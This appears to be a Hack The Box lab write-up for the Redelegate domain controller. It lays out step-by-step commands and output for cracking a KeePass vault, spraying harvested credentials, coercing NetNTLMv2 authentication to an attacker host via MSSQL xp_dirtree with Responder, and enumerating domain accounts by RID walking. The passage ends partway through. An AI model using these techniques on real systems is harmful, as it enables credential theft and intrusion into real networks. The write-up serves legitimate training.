![[Pasted_image_20251029225945.png]]

## Enumeration

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ nmap -A -Pn 10.129.234.50
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 23:00 PDT
Nmap scan report for 10.129.234.50
Host is up (0.15s latency).
Not shown: 984 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 10-20-24  01:11AM                  434 CyberAudit.txt
| 10-20-24  05:14AM                 2622 Shared.kdbx
|_10-20-24  01:26AM                  580 TrainingAgenda.txt
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-30 06:00:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-10-30T06:01:18+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.234.50:1433: 
|     Target_Name: REDELEGATE
|     NetBIOS_Domain_Name: REDELEGATE
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: redelegate.vl
|     DNS_Computer_Name: dc.redelegate.vl
|     DNS_Tree_Name: redelegate.vl
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.234.50:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-30T05:48:47
|_Not valid after:  2055-10-30T05:48:47
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc.redelegate.vl
| Not valid before: 2025-10-29T05:46:29
|_Not valid after:  2026-04-30T05:46:29
|_ssl-date: 2025-10-30T06:01:18+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: REDELEGATE
|   NetBIOS_Domain_Name: REDELEGATE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: redelegate.vl
|   DNS_Computer_Name: dc.redelegate.vl
|   DNS_Tree_Name: redelegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-30T06:01:09+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/29%OT=21%CT=1%CU=42673%PV=Y%DS=2%DC=T%G=Y%TM=6902FF
OS:34%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS
OS:=A)SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=103%GCD=1%IS
OS:R=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%II=I%S
OS:S=S%TS=A)SEQ(SP=108%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M542NW
OS:8ST11%O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M5
OS:42ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%
OS:T=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
OS:T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=
OS:O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-30T06:01:10
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   197.02 ms 10.10.16.1
2   99.48 ms  10.129.234.50

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.46 seconds
```

Some quick observations, but `FTP` allows `anonymous` access. The machine is a domain machine, its hostname is `dc.redelegate.vl`.  There's an `MSSQL` instance.  `RDP` is exposed.  `WinRM` is also exposed.

As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using tooling for this purpose
https://github.com/SYANiDE-/tooling

```
- entries in /etc/hosts
	- echo "10.129.234.50 dc.redelegate.vl redelegate.vl redelegate dc" | sudo tee -a /etc/hosts
- /etc/resolv.conf
	- domain redelegate.vl
	- nameserver 10.129.234.50
- /etc/krb5.conf
	- sudo make_krb5.conf.py -d dc.redelegate.vl -w
- timesync to the domain controller
	- sudo systemctl start vbox-disable-timesync.service
	- sudo ntpdate -u dc.redelegate.vl
```

Let's check if the `guest` account is enabled:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ nxc smb dc.redelegate.vl -u guest -p ""
SMB         10.129.234.50   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.50   445    DC               [-] redelegate.vl\guest: STATUS_ACCOUNT_DISABLED
```

It is disabled.  Let's check on the `FTP` service.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ ftp dc.redelegate.vl 21
Connected to dc.redelegate.vl.
220 Microsoft FTP Service
Name (dc.redelegate.vl:notroot): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||54329|)
125 Data connection already open; Transfer starting.
10-20-24  01:11AM                  434 CyberAudit.txt
10-20-24  05:14AM                 2622 Shared.kdbx
10-20-24  01:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *
mget CyberAudit.txt [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||54332|)
125 Data connection already open; Transfer starting.
100% |***************************************************************|   434        2.16 KiB/s    00:00 ETA
226 Transfer complete.
434 bytes received in 00:00 (1.43 KiB/s)
229 Entering Extended Passive Mode (|||54333|)
125 Data connection already open; Transfer starting.
100% |***************************************************************|  2622       13.01 KiB/s    00:00 ETA
226 Transfer complete.
2622 bytes received in 00:00 (8.62 KiB/s)
229 Entering Extended Passive Mode (|||54335|)
125 Data connection already open; Transfer starting.
100% |***************************************************************|   580        2.67 KiB/s    00:00 ETA
226 Transfer complete.
580 bytes received in 00:00 (1.82 KiB/s)
ftp> exit
221 Goodbye.
```

There were a few files, I went ahead and downloaded them.  

## Downloaded Files

The `CyberAudit.txt`:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ cat CyberAudit.txt 
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:

1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:

1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

Very interesting.  

The `TrainingAgenda.txt`:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ cat TrainingAgenda.txt 
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October  | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails and what to do when you see one


Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?


Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password 


Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

Interesting... `SeasonYear!`.  Maybe that is a literal, maybe that is a clue for constructing a list of passwords for brute forcing or spraying.  Let's quickly generate a password list.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ echo 'SeasonYear!' | tee -a pwlist.txt

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ for year in 20{00..25}; do for season in Summer Winter Spring Fall; do echo "$season$year"'!' | tee -a pwlist.txt; done; done
```


## Keepass vault

The `Shared.kdbx` is a `keepass` vault:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ file Shared.kdbx 
Shared.kdbx: Keepass password database 2.x KDBX
```

Try to crack the master password.  For that, I'll need to extract a hash.  I can use `keepass2john` for that

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ keepass2john Shared.kdbx | tee -a Shared.kdbx.hash
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca
```

I had initially started to try bruteforcing this using `rockyou.txt`, but a couple observations, the algorithm is `AES` and the iteration count is `600,000`.  So `rockyou.txt` is going to take a really, really long time.

I aborted after about 10 mins.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ sudo john Shared.kdbx.hash --wordlist=/usr/share/wordlists/rockyou.txt --force 
[sudo] password for notroot: 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:10:20 0.09% (ETA: 2025-11-06 19:11) 0g/s 25.38p/s 25.38c/s 25.38C/s 1qwert..091088
Session aborted
```

Going back on the generated password list, that actually ended up paying off.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ sudo john Shared.kdbx.hash --wordlist=pwlist.txt --force 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared)     
1g 0:00:00:04 DONE (2025-10-29 23:38) 0.2288g/s 24.02p/s 24.02c/s 24.02C/s Summer2024!..SeasonYear!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The master password is `Fall2024!`.  

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ keepass2 Shared.kdbx
```

Lets open up the `Shared.kdbx` using `keepass`

![[Pasted_image_20251029234334.png]]

There are a number of folders (IT, Helpdesk, Finance), and each one has a number of stored credentials.

![[Pasted_image_20251029234554.png]]

Here is what I collected:

```
### IT
FTP:FTPUser:SguPZBKdRyxWzvXRWy6U:deprecated
FS01 Admin:Administrator:Spdv41gg4BlBgSYIW1gF:
WEB01:WordPress Panel:cn4KOEgsHqvKXPjEnSD9:
SQL Guest Access:SQLGuest:zDPBpaF4FywlqIv11vii
### HelpDesk
KeyFob Combination::22331144:
### Finance
Timesheet Manager:Timesheet:hMFS4I0Kj8Rcd62vqi5X:
Payrol App:Payroll:cVkqz4bCM7kJRSNlgx2G:
```

## Finding a use for discovered credentials

It looks like the following pairs might be valid:

```
ftp:SguPZBKdRyxWzvXRWy6U
ftpuser:SguPZBKdRyxWzvXRWy6U
fs01:Spdv41gg4BlBgSYIW1gF
Administrator:Spdv41gg4BlBgSYIW1gF
web01:cn4KOEgsHqvKXPjEnSD9
sqlguest:zDPBpaF4FywlqIv11vii
timesheet:hMFS4I0Kj8Rcd62vqi5X
payroll:cVkqz4bCM7kJRSNlgx2G
```

Need to write them out to individual files

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ echo """ftp:SguPZBKdRyxWzvXRWy6U
ftpuser:SguPZBKdRyxWzvXRWy6U
fs01:Spdv41gg4BlBgSYIW1gF
Administrator:Spdv41gg4BlBgSYIW1gF
web01:cn4KOEgsHqvKXPjEnSD9
sqlguest:zDPBpaF4FywlqIv11vii
timesheet:hMFS4I0Kj8Rcd62vqi5X
payroll:cVkqz4bCM7kJRSNlgx2G""" > creds.cdv

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ for line in $(cat creds.cdv); do cut -d ':' -f 1 <<<$line | tee -a users.txt; cut -d ':' -f 2 <<<$line | tee -a passes.txt; done
```

Try spraying.  There are several services crackmapexec can run password spraying against:

```
$ nxc --help

[...]

Available Protocols:
  {winrm,ssh,mssql,rdp,vnc,smb,ldap,nfs,wmi,ftp}
	winrm               own stuff using WINRM     #open
    ssh                 own stuff using SSH
    mssql               own stuff using MSSQL     #open
    rdp                 own stuff using RDP       #open
    vnc                 own stuff using VNC
	smb                 own stuff using SMB       #open
    ldap                own stuff using LDAP      #open
    nfs                 own stuff using NFS
    wmi                 own stuff using WMI
    ftp                 own stuff using FTP       #open
```

Nothing on `SMB` and `LDAP`.  
```
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ nxc smb dc.redelegate.vl -u users.txt -p passes.txt --no-bruteforce --continue-on-success

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ nxc ldap dc.redelegate.vl -u users.txt -p passes.txt --no-bruteforce --continue-on-success
```

On `MSSQL`, I got a hit:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ nxc mssql dc.redelegate.vl -u users.txt -p passes.txt --no-bruteforce --continue-on-success --local-authMSSQL       10.129.234.50   1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.234.50   1433   DC               [-] DC\ftp:SguPZBKdRyxWzvXRWy6U (Login failed for user 'ftp'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\ftpuser:SguPZBKdRyxWzvXRWy6U (Login failed for user 'ftpuser'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\fs01:Spdv41gg4BlBgSYIW1gF (Login failed for user 'fs01'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\Administrator:Spdv41gg4BlBgSYIW1gF (Login failed for user 'Administrator'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\web01:cn4KOEgsHqvKXPjEnSD9 (Login failed for user 'web01'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [+] DC\sqlguest:zDPBpaF4FywlqIv11vii 
MSSQL       10.129.234.50   1433   DC               [-] DC\timesheet:hMFS4I0Kj8Rcd62vqi5X (Login failed for user 'timesheet'. Please try again with or without '--local-auth')
MSSQL       10.129.234.50   1433   DC               [-] DC\payroll:cVkqz4bCM7kJRSNlgx2G (Login failed for user 'payroll'. Please try again with or without '--local-auth')
```

The account `sqlguest` can authenticate as an `MSSQL` user.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ impacket-mssqlclient sqlguest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SQLGuest  guest@master)> 
```

There is a whole lot of nothing going on and/or going for this `MSSQL` instance.   The only thing of interest seems to be the ability to `xp_dirtree` a `UNC path` that points back to my attacking machine, and capture the` NetNTLMv2-SSP` authentication using `responder`:

```sh
SQL (SQLGuest  guest@msdb)> xp_dirtree \\10.10.16.59\shared\file
```

And `responder`:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ sudo responder -I tun0 -A
[sudo] password for notroot: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    MDNS                       [OFF]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.59]
    Responder IPv6             [dead:beef:4::1039]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-399GZJDC3HJ]
    Responder Domain Name      [RMGF.LOCAL]
    Responder DCE-RPC Port     [46231]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.16.59) is not on the same subnet than the DNS server (10.129.234.50).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.16.59) is not on the same subnet than the DNS server (192.168.50.1).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[+] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[SMB] NTLMv2-SSP Client   : 10.129.234.50
[SMB] NTLMv2-SSP Username : REDELEGATE\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::REDELEGATE:a1829572d87cbd58:6F8B4EAD90D9387997BED7E973A185DD:010100000000000080C2BEA13549DC0106465B8E58B661F0000000000200080052004D004700460001001E00570049004E002D0033003900390047005A004A0044004300330048004A0004003400570049004E002D0033003900390047005A004A0044004300330048004A002E0052004D00470046002E004C004F00430041004C000300140052004D00470046002E004C004F00430041004C000500140052004D00470046002E004C004F00430041004C000700080080C2BEA13549DC01060004000200000008003000300000000000000000000000003000007DF20DB760243F05E63DC4EC90677E563E7AAC85DA95330A0050F9BC64BA366D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350039000000000000000000
```

Try to crack it

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ hashcat --identify sql_svc.hash
The following hash-mode match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   5600 | NetNTLMv2                                                  | Network Protocol

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ hashcat -m 5600 sql_svc.hash pwlist.txt --force --quiet

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ hashcat -m 5600 sql_svc.hash passes.txt --force --quiet

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt --force --quiet
```

The hash does not seem to crack...

Other interesting finds in the `MSSQL` instance.  I found an SQL Server encoded sid for `sql_svc`:

```
SQL (SQLGuest  guest@master)> select SUSER_SID('redelegate\sql_svc')
                                                              
-----------------------------------------------------------   
b'010500000000000515000000a185deefb22433798d8e847a5f040000'
```

I have a script, I did not write it and I forget where I got it (I think I may have hallucinated it at least in part with `Gemini`, and then finished what it started).  But this script can convert an MSSQL binary SID like this back into a WIndows SID:

`mssql_sid_to_windows_sid.py`

```python
#!/usr/bin/env python3
import struct, binascii


print("In MSSQL, use something like the following to get the hexstr SID representation of a 'USER', which is a Windows Domain account:\n    select SUSER_SID('SIGNED\\mssqlsvc')\n")


def convert_binary_sid_to_string(binary_sid):
    if not isinstance(binary_sid, bytes) or len(binary_sid) < 8:
        return None  # SID must be at least 8 bytes long

    # Unpack the fixed parts of the SID
    revision_level = struct.unpack('<B', binary_sid[0:1])[0]
    subauthority_count = struct.unpack('<B', binary_sid[1:2])[0]
    identifier_authority = struct.unpack('>Q', b'\x00\x00' + binary_sid[2:8])[0] # Big-endian for identifier authority

    sid_parts = [f"S-{revision_level}", str(identifier_authority)]

    # Unpack the subauthorities
    offset = 8
    for _ in range(subauthority_count):
        if offset + 4 > len(binary_sid):
            return None  # Incomplete SID
        subauthority = struct.unpack('<I', binary_sid[offset:offset+4])[0]
        sid_parts.append(str(subauthority))
        offset += 4

    return "-".join(sid_parts)


sid_binary = binascii.unhexlify(input("Give hexstr sid from mssql:> "))
windows_sid_string = convert_binary_sid_to_string(sid_binary)
print(f"Binary SID: {sid_binary.hex()}")
print(f"Windows SID String: {windows_sid_string}")
```

Convert the sid:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ ~/bin/mssql_sid_to_windows_sid.py
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\mssqlsvc')
In MSSQL, use something like the following to get the hexstr SID representation of a 'USER', which is a Windows Domain account:
    select SUSER_SID('SIGNED\mssqlsvc')

Give hexstr sid from mssql:> 010500000000000515000000a185deefb22433798d8e847a5f040000
Binary SID: 010500000000000515000000a185deefb22433798d8e847a5f040000
Windows SID String: S-1-5-21-4024337825-2033394866-2055507597-1119
```

Now that's really interesting, because there are stored procedures for going the other way too.  The SID can be translated back into binary:

```sh
SQL (SQLGuest  guest@master)> select SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1119')
                                                              
-----------------------------------------------------------   
b'010500000000000515000000a185deefb22433798d8e847a5f040000'
```

Do the math, and we have everything we need to go full circle, starting with a Windows Domain format SID, and translate it to a domain account name:

```
SQL (SQLGuest  guest@master)> select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1119')))
                     
------------------   
REDELEGATE\sql_svc
```

That's great, let's go ahead and generate a batch file to iterate through a range of RIDs.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ for item in {1000..1200}; do echo "select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-$item')))" | tee -a ridwalk.txt; done
select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1000')))
select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1001')))
select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1002')))
select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1003')))
select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1004')))

[...]
select SUSER_SNAME(CONVERT(VARBINARY(MAX),SID_BINARY('S-1-5-21-4024337825-2033394866-2055507597-1200')))
```

We can pass this file to `impacket-mssqlclient` to perform the ridwalk and grep out matches on domain.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ impacket-mssqlclient DC/sqlguest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -file ridwalk.txt | grep REDELEGATE --text
REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG   
REDELEGATE\DC$   
REDELEGATE\FS01$   
REDELEGATE\Christine.Flanders   
REDELEGATE\Marie.Curie   
REDELEGATE\Helen.Frost   
REDELEGATE\Michael.Pontiac   
REDELEGATE\Mallory.Roberts   
REDELEGATE\James.Dinkleberg   
REDELEGATE\Helpdesk   
REDELEGATE\IT   
REDELEGATE\Finance   
REDELEGATE\DnsAdmins   
REDELEGATE\DnsUpdateProxy   
REDELEGATE\Ryan.Cooper   
REDELEGATE\sql_svc
```

And now we have our list of `domainprincipals.txt`.  Notably some of these are machines and groups

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ echo '''REDELEGATE\SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG   
REDELEGATE\DC$   
REDELEGATE\FS01$   
REDELEGATE\Christine.Flanders   
REDELEGATE\Marie.Curie   
REDELEGATE\Helen.Frost   
REDELEGATE\Michael.Pontiac   
REDELEGATE\Mallory.Roberts   
REDELEGATE\James.Dinkleberg   
REDELEGATE\Helpdesk   
REDELEGATE\IT   
REDELEGATE\Finance   
REDELEGATE\DnsAdmins   
REDELEGATE\DnsUpdateProxy   
REDELEGATE\Ryan.Cooper   
REDELEGATE\sql_svc''' | sed -re 's/.+\\//g' | tee -a domainprincipals.txt
```

From that, we can go on to split the file out to `domainusers.txt`, `domaincomputers.txt`, and `domaingroups.txt`

## Finding a use for discovered names

The `keepass` discovered passwords are worth a shot, but the list has to be cleaned of duplicates:

```
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ cat passes.txt | sort -u > passes2.txt
```

The other discovered passwords are `SeasonYear!`, `Fall2024!`, and who knows, maybe even `22331144`.   Those will also be added to `passes2.txt` 

Notable finds for `smb`:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ nxc smb dc.redelegate.vl -u domainusers.txt -p passes2.txt --continue-on-success

SMB         10.129.234.50   445    DC               [-] redelegate.vl\Mallory.Roberts:cn4KOEgsHqvKXPjEnSD9 STATUS_ACCOUNT_RESTRICTION
```

It was actually every password that `mallory.roberts` came back `STATUS_ACCOUNT_RESTRICTION`.

This status could be for a few different reasons.  One of which is if the user has logon hours set.  Another is if the authentication method, such as `NTLM`, is not allowed. Policy restrictions can also be the cause:

https://system32.eventsentry.com/codes/field/Netlogon%20Error%20Codes

```
0XC000006E
	STATUS_ACCOUNT_RESTRICTION
Account restrictions are preventing this user from signing in. For example: blank passwords aren't allowed, sign-in times are limited, or a policy restriction has been enforced.
```

So far, these are the word lists I'm working with:

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/redelegate]
└─$ timeout 1 tail -f passes2.txt domain*
==> passes2.txt <==
cn4KOEgsHqvKXPjEnSD9
cVkqz4bCM7kJRSNlgx2G
hMFS4I0Kj8Rcd62vqi5X
SguPZBKdRyxWzvXRWy6U
Spdv41gg4BlBgSYIW1gF
zDPBpaF4FywlqIv11vii
SeasonYear!
Fall2024!
22331144

==> domaincomputers.txt <==
SQLServer2005SQLBrowserUser-Q13O908QBPG   
DC$   
FS01$   

==> domaingroups.txt <==
Helpdesk   
IT   
Finance   
DnsAdmins   
DnsUpdateProxy   

==> domainusers.txt <==
Christine.Flanders   
